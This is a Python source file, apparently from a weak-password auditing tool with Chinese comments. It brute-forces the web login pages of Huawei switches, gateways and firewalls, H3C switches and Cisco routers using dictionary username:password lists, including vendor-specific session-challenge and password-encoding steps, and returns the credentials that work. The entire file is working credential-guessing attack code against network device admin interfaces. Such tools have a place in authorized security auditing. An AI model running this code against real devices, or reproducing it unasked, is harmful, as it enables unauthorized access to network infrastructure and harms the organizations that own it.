import requests
import re
import urllib3
import time

from loguru import logger
from typing import List

from interface import IBruteForce
from device import Device
from filesio import Reader
from decoder import set_passwd, encode64


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class BruteForceInvoke:
    '''在外部调用此类, 读取模板文件, 执行弱密码枚举模块'''

    def __init__(self):
        self.TMPLATE = 0
        self.GOBY = 1
        self.out_file_path = None

    def set_output(self, out_file_path, mode='a+'):
        self.out_file_path = out_file_path

    def do(self, in_file_path, file_type=1):
        '''读取模板文件, 进行密码枚举

        Keyword arguments:
        in_file_path: templates file path.
        file_type: templates file type, support stand type and goby output type.
        '''
        reader = Reader(in_file_path)
        # 根据不同文件类型选择读取方式
        file_type_mapper = {
            self.TMPLATE: reader.xls_file_reader,
            self.GOBY: reader.goby_file_reader
        }
        device_list_mapper: dict = file_type_mapper.get(file_type)()
        if not device_list_mapper:
            raise KeyError
        for format_brand, device_obj_list in device_list_mapper.items():
            # 根据设备品牌获取不同爆破类的实例
            brute_force_obj: IBruteForce = BruteForceFacory(
                format_brand=format_brand,
                device_obj_list=device_obj_list
            ).build()
            # 执行爆破
            if brute_force_obj:
                # 如果out_file_path未设置, 则输出到控制台
                brute_force_obj.invoke(self.out_file_path)
            else:
                logger.debug(f'不支持的设备类型: {format_brand}')


class BruteForceFacory:
    '''brute force工厂类, 根据设备文件的读取结果返回具体的BruteForce类'''

    def __init__(self, format_brand, device_obj_list):
        # TODO 扩展其他品牌的BruteForce类
        self.class_mapper = {
            'huawei': HuaweiBruteForce,
            'h3c': H3CBruteForce,
            'cisco': CiscoBruteForce
        }
        self.format_brand = format_brand
        self.device_obj_list = device_obj_list

    def build(self):
        return self.class_mapper.get(
            self.format_brand,
            self.not_support_device
        )(self.device_obj_list)

    def not_support_device(self, *args):
        return None


class HuaweiBruteForce(IBruteForce):
    '''针对华为的网络设备进行弱口令爆破

    Construct keyword arguments:
    device_obj_list -> list of Device object
    '''

    def __init__(self, device_obj_list: List[Device]):
        super().__init__(device_obj_list)
        self.method_mapper = self.set_method_mapper()

    def set_method_mapper(self):
        method_mapper = {
            'firewall': self.firewall_brute_force,
            'switch': self.switch_brute_force,
            'gateway': self.gateway_brute_force,
            'secoway': self.secoway_brute_force
        }
        return method_mapper

    def switch_brute_force(self, device: Device):
        '''针对Huawei-Switch的爆破方法'''
        base_url = 'https://{}/{}'
        with open(self.passwd_dict_mapper[device.format_brand]) as f:
            lines = f.readlines()
        for line in lines:
            if line[0] == '#':
                continue
            line = line.replace('\n', '')
            username, passwd = line.split(':')
            post_body = {
                'UserName': username,
                'Password': passwd,
                'Edition': '0'
            }
            try:
                res = requests.post(
                    base_url.format(
                        device.ip, 'login.cgi?_=0.09697750384233583'
                    ),
                    data=post_body,
                    verify=False,
                    headers=self.header,
                    timeout=5
                )
                if not re.search('ErrorMsg', res.text, re.I) and res.status_code == 200:
                    return f'{username}:{passwd}'
            except requests.ConnectTimeout as te:
                print(te)
                break
        return None

    def gateway_brute_force(self, device: Device):
        '''针对Hua-AR-Agile-gateway的爆破方法'''
        # 必须是https
        base_url = 'https://{}/login.cgi'
        sess = requests.session()
        with open(self.passwd_dict_mapper[device.format_brand]) as f:
            lines = f.readlines()
        for line in lines:
            if line[0] == '#':
                continue
            line = line.replace('\n', '')
            username, passwd = line.split(':')
            post_body = f"UserName={username}&Password={passwd}&LanguageType=0"
            cookie = {
                'loginUrl': 'loginPro',
                'FactoryName': 'Huawei%20Technologies%20Co.',
                'FactoryLogoUrl': '../../images/',
                'Package': 'NO',
                'ResetFlag': '0',
                'loginFlag': 'true',
                'ARlanguage': 'property-zh_CN.js'
            }
            try:
                res = sess.post(
                    base_url.format(device.ip),
                    data=post_body,
                    verify=False,
                    cookies=cookie,
                    headers=self.header,
                    timeout=5
                )
                if not re.search('Error', res.text, re.I):
                    return f'{username}:{passwd}'
            except requests.ConnectTimeout as te:
                print(te)
                break
        return None

    def firewall_brute_force(self, device: Device):
        '''针对Huawei-Firewall的爆破方法'''
        base_url = 'http://{}/{}'
        sess = requests.session()
        server_cookie = None
        with open(self.passwd_dict_mapper[device.format_brand]) as f:
            lines = f.readlines()
        for line in lines:
            time.sleep(1)
            if line[0] == '#':
                continue
            line = line.replace('\n', '')
            username, passwd = line.split(':')
            # 第一次请求获取challenge
            try:
                res = sess.get(
                    base_url.format(device.ip, 'login.html'),
                    headers=self.header,
                    verify=False,
                    cookies=server_cookie,
                    timeout=5
                )
                if 'Set-Cookie' in res.headers.keys():
                    server_cookie = {
                        'SESSIONID': re.findall('SESSIONID=(.*)', res.headers['Set-Cookie'])[0]
                    }
                    # 前端不加密的防火墙
                    if re.search('HUAWEI', server_cookie['SESSIONID']):
                        result = self.device_USG(server_cookie, username, passwd, sess, device)
                    # 前端加密的防火墙
                    else:
                        result = self.device_SRG20(server_cookie, username, passwd, sess, device)

                    if result is not None:
                        return result
            except requests.ConnectTimeout as te:
                logger.error(f'{device.ip}: {te}')
                break
        return None

    def device_SRG20(self, server_cookie, username, passwd, sess, device):
        '''前端加密密码的防火墙'''
        base_url = 'http://{}/{}'
        challenge = server_cookie['SESSIONID'].split('&')[1]
        encode_passwd = set_passwd(passwd, challenge)
        post_body = {
            'username': username,
            'platcontent': '',
            'password': encode_passwd
        }
        cookies = {
           'SESSIONID': challenge
        }
        try:
            res = sess.post(
                url=base_url.format(device.ip, 'home.html'),
                data=post_body,
                cookies=cookies,
                headers=self.header,
                timeout=5,
                verify=False
            )
            if res.status_code >= 200 and res.status_code < 400:
                return f'{username}:{passwd}'
        except requests.ConnectTimeout as te:
            logger.error(f'{device.ip},{device.brand}: {te}')
        return None

    def device_USG(self, server_cookie, username, passwd, sess, device):
        '''前端不加密密码的防火墙'''
        base_url = 'https://{}:8443/{}'
        post_body = {
            'spring-security-redirect': '',
            'language': 'zh_CN',
            'password': passwd,
            'username': username,
            'platcontent': ''
        }
        try:
            res = sess.post(
                url=base_url.format(device.ip, 'default.html?dc=1594957393111'),
                data=post_body,
                headers=self.header,
                timeout=5,
                verify=False
            )
            if res.status_code >= 200 and res.status_code < 400:
                return f'{username}:{passwd}'
        except requests.ConnectTimeout as te:
            logger.error(f'{device.ip},{device.brand}: {te}')
        return None

    def secoway_brute_force(self, device: Device):
        '''针对HuaWei-Secoway-Firewall的爆破方法'''
        base_url = 'http://{}/{}'
        sess = requests.session()
        with open(self.passwd_dict_mapper[device.format_brand]) as f:
            lines = f.readlines()
        for line in lines:
            if line[0] == '#':
                continue
            line = line.replace('\n', '')
            username = line.split(':')[0]
            passwd = line.split(':')[1]
            # 第一次请求获取session
            try:
                res = sess.get(
                    base_url.format(device.ip, 'get_new_sessionid/'),
                    timeout=5,
                    headers=self.header,
                    verify=False
                )
            except requests.ConnectTimeout as te:
                logger.error(f'{device.ip}: {te}')
                break
            else:
                sessionid = res.text.split('&')[0]

            post_body = {
                'spring-security-redirect': '',
                'password': f'{passwd}',
                'language': 'h_CN',
                'lang': '%BC%F2%CC%E5%D6%D0%CE%C4',
                'username': f'{username}',
                'platcontent': ''
            }
            cookie = {
                'logotype': 'USG2110-F',
                'copyright': '2008-2013',
                'noChange': '',
                'hSign': 'secoway',
                'fwlangeuage': 'zh_CN',
                'curLang': 'zh_CN',
                'fwloginname': f'{username}',
                'nochangePwd': '',
                'SESSIONID': f'{sessionid}'
            }
            # 第二次请求进行爆破
            try:
                res = sess.post(
                    base_url.format(
                        device.ip, 'default.html?dc=1594622767454'),
                    data=post_body,
                    cookies=cookie,
                    verify=False,
                    headers=self.header,
                    timeout=5
                )
                if res.status_code == 200:
                    sess.close()
                    return f'{username}:{passwd}'
            except requests.ConnectTimeout as te:
                logger.error(f'{device.ip}: {te}')
                break
        sess.close()
        return None


class H3CBruteForce(IBruteForce):
    '''h3c的默认口令爆破'''
    def __init__(self, device_obj_list: List[Device]):
        super().__init__(device_obj_list)
        self.method_mapper = self.set_method_mapper()

    def set_method_mapper(self):
        method_mapper = {
            'switch': self.switch_brute_force,
        }
        return method_mapper

    def switch_brute_force(self, device: Device):
        base_url = 'https://{}/wnm/frame/login.php'
        with open(self.passwd_dict_mapper[device.format_brand]) as f:
            lines = f.readlines()
        for line in lines:
            if line[0] == '#':
                continue
            line = line.replace('\n', '')
            username, passwd = line.split(':')
            param = {
                'user_name': username,
                'password': passwd,
                'ssl': 'false',
                'host': device.ip,
                'lang': 'cn'
            }
            try:
                res = requests.get(
                    url=base_url.format(device.ip),
                    params=param,
                    headers=self.header,
                    verify=False,
                    timeout=5
                )
                if not re.search('error', res.text):
                    return f'{username}:{passwd}'
            except requests.ConnectTimeout as te:
                logger.error(te)
                break
        return None


class CiscoBruteForce(IBruteForce):
    '''思科设备的默认口令爆破类'''
    def __init__(self, device_obj_list: List[Device]):
        super().__init__(device_obj_list)
        self.method_mapper = self.set_method_mapper()

    def set_method_mapper(self):
        method_mapper = {
            'router': self.router_brute_force,
        }
        return method_mapper

    def router_brute_force(self, device: Device):
        base_url = 'http://{}/'
        with open(self.passwd_dict_mapper[device.format_brand]) as f:
            lines = f.readlines()
        for line in lines:
            if line[0] == '#':
                continue
            line = line.replace('\n', '')
            username, passwd = line.split(':')
            basic_auth = encode64(f'{username}:{passwd}'.encode())
            self.header['Authorization'] = f'Basic {basic_auth}'
            try:
                res = requests.get(
                    url=base_url.format(device.ip),
                    headers=self.header,
                    verify=False,
                    timeout=5
                )
                if res.status_code != 401:
                    return f'{username}:{passwd}'
            except requests.ConnectTimeout as te:
                logger.error(te)
                break
        return None
